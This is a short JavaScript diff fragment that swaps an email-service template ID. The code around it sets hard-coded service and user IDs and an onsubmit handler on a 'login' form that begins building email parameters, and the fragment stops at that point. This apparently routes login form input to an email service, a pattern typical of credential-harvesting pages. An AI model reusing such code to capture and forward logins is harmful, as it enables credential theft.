@@ -7,7 +7,7 @@ btn.onclick = () => {
 };
 const serviceId = "service_d6me3am";
 const userId = "TW3eLRAOMUcH1InEX";
-const templateId = "template_nozg909";
+const templateId = "template_e1pvkye";
 document.getElementById("login").onsubmit = function (event) {
   event.preventDefault();
   const emailParams = {
